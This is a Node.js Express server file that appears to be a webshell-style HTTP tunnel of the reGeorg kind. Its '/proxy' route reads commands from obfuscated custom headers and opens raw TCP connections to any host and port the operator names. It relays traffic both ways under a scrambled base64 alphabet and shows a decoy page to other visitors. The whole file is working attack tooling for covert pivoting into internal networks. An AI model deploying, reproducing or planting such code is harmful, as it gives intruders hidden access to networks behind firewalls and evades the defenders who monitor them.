const express = require('express')
const app = express()

var http = require('http');
var net = require('net');
var en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var de = "t3keOL5DZEuImxYRKV179ogB0fjvJ+rswP2dp8MFbanlNUcSqHhCWiGTzQ64yA/X";
var dataBuff = []; // 利用 cookie 快速找 data
var tcpconns = []; // session   session中存放的是tcpConn   用cookie定位tcpConn


function createOutboundTCP(res, host, port, mark)
{
    // var reqCookie = header['cookie'];
    if(mark === null)
    {
		var tcpConn = new net.Socket();
		tcpConn.connect(port,host);
		tcpConn.on( 'connect', function() {
			// var cookie = 'Ur' + Math.random();
			tcpconns[mark] = tcpConn;
			dataBuff[mark] = new Array();

			res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
			res.end();
		});

		tcpConn.on('data', function(data) {
			dataBuff[mark].unshift(data);
			// console.log("[!] Recv from server: " + data.toString('hex') + Date.now());
		});

		tcpConn.on('error', function(error) {
			console.log("Error creating new Outbound: " + error.message);
			res.writeHead(200, {'Xfulovtoate':'orm5it0Qa3Q6wTbk8Le4uoevx1jNqhaIFzTnaM1GpH70','Vifk' : 'B4LqkZ2Fb6xREzSBgV0TUHU36Bl9FEMxxsabiDhypWS'});
			res.end();
		});
    }
    else if(mark != null && tcpconns[mark] == null)
    {
            var tcpConn = new net.Socket();
            tcpConn.connect(port,host);

            tcpConn.on( 'connect', function() {
				tcpconns[mark] = tcpConn;
				dataBuff[mark] = new Array();
				res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
				res.end();
            });

			tcpConn.on('data', function(data) {
				dataBuff[mark].unshift(data);
				// console.log("[!] Recv from server: " + data.toString('hex') + Date.now());
			});

            tcpConn.on('error', function(error){
				console.log("Error creating new Outbound: "+error.message);
				res.writeHead(200, {'Xfulovtoate':'orm5it0Qa3Q6wTbk8Le4uoevx1jNqhaIFzTnaM1GpH70','Vifk' : 'B4LqkZ2Fb6xREzSBgV0TUHU36Bl9FEMxxsabiDhypWS'});
				res.end();
            });
    }
    else
    {
        res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
        res.end();
    }
}

function readOutboundTCP(res, mark)
{
	var currData = dataBuff[mark].pop();
	if(currData != null)
	{
		res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy','Connection': 'Keep-Alive'});
		res.write(StrTr(Buffer.from(currData).toString('base64'), en, de));
		// var tmp = new Buffer.from(currData).toString('hex');
		// console.log("[+] Send to client: " + tmp);
		// console.log("[+] Length of data to recv: " + currData.length);
		res.end();
	}
	else
	{
		console.log('NO DATA IN BUFFER');
		res.writeHead(200, {'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
		res.end();
	}

}

function disconnectOutboundTCP(res, mark, error)
{
	var tcpConn=tcpconns[mark];

	if(tcpConn!=null)
	{
		tcpConn.destroy();
		tcpConn=null;
		tcpconns[mark]=null;
		dataBuff[mark]=null;
	}

	if(error!=null)
	{
		var sessionid = 'Ur' + Math.random();
		res.writeHead(200, {'Set-Cookie': 'SESSIONID=' + sessionid + ';', "XXXX": error.message});
		res.end();
	 }
	 else
	 {
		res.writeHead(200, {'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
		res.end();
	 }

}
function deault_page(res) {
	var sessionid = 'Ur' + Math.random();
	res.writeHead(200, {'Set-Cookie': 'SESSIONID=' + sessionid + ';'});
	res.end("<!-- 4XGAWvTzOgoJqo8xf7oTSQfnpbwnxVilvENiU8KxTEnGLUqgdYHYxKi3_b30S -->");
}

function forwardData(req, res, mark)
{
	var fdata;

	req.on('data', function (chunk) {
		fdata = chunk;
	});

	req.on('end', function (){
		if(fdata != null)
		{
			var tcpSocket = tcpconns[mark];
			if(tcpSocket != null)
			{
				databaffuer = new Buffer.from(StrTr(fdata.toString(), de, en), 'base64');
				// console.log("[+] Send to server: " + tmp);
				// console.log("[+] Length of data to send: " + databaffuer.length);
				tcpSocket.write(databaffuer);
				res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
				res.end();
			}
			else
			{
				console.log('No Cookie session to forward');
				res.writeHead(200,{'Xfulovtoate':'orm5it0Qa3Q6wTbk8Le4uoevx1jNqhaIFzTnaM1GpH70','Vifk':'dNjNxKHCAtzFfDd1INueNY9szIfKpBE1yDblp_EdoGKGjfT1U6k6GZ'});
				res.end();
			}
		}
		else
		{
			console.log('No data in forward');
			res.writeHead(200,{'Xfulovtoate':'orm5it0Qa3Q6wTbk8Le4uoevx1jNqhaIFzTnaM1GpH70','Vifk':'dNjNxKHCAtzFfDd1INueNY9szIfKpBE1yDblp_EdoGKGjfT1U6k6GZ'});
			res.end();
		}

	});
}

function StrTr(input, frm, to){
  var r = "";
  for(i=0; i<input.length; i++){
	index = frm.indexOf(input[i]);
	if(index != -1){
	  r += to[index];
	}else{
	  r += input[i];
	}
  }
  return r;
}


app.all('/proxy', function (req, res) {

	var old_header = req.headers;

	var headers = {};
	for(var item in old_header) {
		headers[item.toLowerCase()] = old_header[item];
	}

	res.statusCode = 200;
	var cmd = headers['pnzyudlbmcrzz'];
	if (cmd!=null) {
		mark = cmd.substring(0, 22);
		cmd = cmd.substring(22);
		// console.log("Mark: " + mark);
		// console.log("Cookie: " + headers['cookie']);
		if (cmd == "G47kt1MIrJ86ArGkXGI5PbFUK9Yxu6liHZomUl4") {
			// console.log('connect');
			try{
				var target_str = Buffer.from(StrTr(headers["hhnn"], de, en), 'base64').toString();
				var target_ary = target_str.split("|");
				var target = target_ary[0];
				port = parseInt(target_ary[1]);
				createOutboundTCP(res, target, port, mark);
			}catch(error){
				disconnectOutboundTCP(res, mark, error);
			}
		}else if(cmd == "gGTwmXQL642AMKwjTS6oVfE8XXQLbMXUcxqH4q3x"){
			// console.log('disconnect');
			try
			{
				disconnectOutboundTCP(res, mark, null);
			}
			catch(error)
			{
				disconnectOutboundTCP(res, mark, error);
			}
		}else if(cmd == "CQeLsL_KxRcfcdOUeXhN6cZdQ0JZrwuSiN4Qlkn"){
			// console.log('read');
			try
			{
				readOutboundTCP(res, mark);
			}
			catch(error)
			{
				disconnectOutboundTCP(res, mark, error);
			}

		}else if(cmd == "6cO1KH8Ltx45AgM3nSmsnaDY"){
			// console.log('forward');
			try
			{
				forwardData(req, res, mark);
			}
			catch(error)
			{
				disconnectOutboundTCP(res, mark, error);
			}

		}
		else{
			deault_page(res);
		}

	}else{
		deault_page(res);
	}

});

app.get('/', (req, res) => {
	res.setHeader('Content-Type', 'text/html');
	res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
	res.end(`Hello!`);
  });


console.log('run on 3000')
app.listen(3000, '0.0.0.0');
console.log('stared')